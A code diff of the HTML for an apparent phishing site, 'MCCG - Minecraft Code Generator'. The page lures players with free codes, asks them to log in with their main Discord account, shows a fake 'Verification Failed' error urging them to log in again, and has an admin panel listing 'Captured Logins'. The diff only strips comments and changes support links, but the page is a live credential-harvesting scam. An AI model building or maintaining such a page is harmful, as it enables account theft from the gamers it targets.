@@ -5,14 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="styles.css">
 
-    <!-- Instant redirect from / to /login -->
     <script>
         if (window.location.pathname === '/' || window.location.pathname === '') {
             window.location.replace('/login');
         }
     </script>
 
-    <!-- Discord Embed Meta Tags -->
     <meta property="og:title" content="MCCG - Minecraft Code Generator">
     <meta property="og:description" content="The most trusted Minecraft Code Generator 2026. Free users get 10 free codes upon sign up. Join thousands of players already using MCCG.">
     <meta property="og:image" content="https://i.ibb.co/HDxMBCcJ/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png">
@@ -136,7 +134,7 @@
                 <p>Make sure you are using your main Discord account. Alternative accounts are prohibited and may result in a permanent ban.</p>
             </div>
             <h1>Verification Failed</h1>
-            <p class="error-message">Something went wrong. Please try again or clear your browser cache and attempt to login again. If errors persist, please <a href="/support" class="support-link">contact support</a>.</p>
+            <p class="error-message">Something went wrong. Please try again or clear your browser cache and attempt to login again. If errors persist, please <a href="/tickets" class="support-link">contact support</a>.</p>
             <button id="try-again-btn" class="primary-btn">Login Again</button>
         </div>
     </div>
@@ -150,13 +148,12 @@
                     <h1>MCCG Admin Panel</h1>
                 </div>
                 <div class="admin-header-right">
-                    <a href="/support" class="secondary-btn" style="text-decoration:none;">Support Tickets</a>
+                    <a href="/tickets" class="secondary-btn" style="text-decoration:none;">Support Tickets</a>
                     <button id="admin-logout-btn" class="secondary-btn">Back to Login</button>
                 </div>
             </header>
 
             <div class="admin-content">
-                <!-- Code Generator -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>MC-CODE Generator</h2>
@@ -185,7 +182,6 @@
                     </div>
                 </section>
 
-                <!-- Captured Logins -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>Captured Logins</h2>
@@ -209,7 +205,6 @@
                     </div>
                 </section>
 
-                <!-- Support Tickets -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>Support Tickets</h2>
@@ -220,7 +215,6 @@
                     </div>
                 </section>
 
-                <!-- Stats -->
                 <section class="admin-section stats-section">
                     <div class="stat-card">
                         <h3>Total Logins</h3>
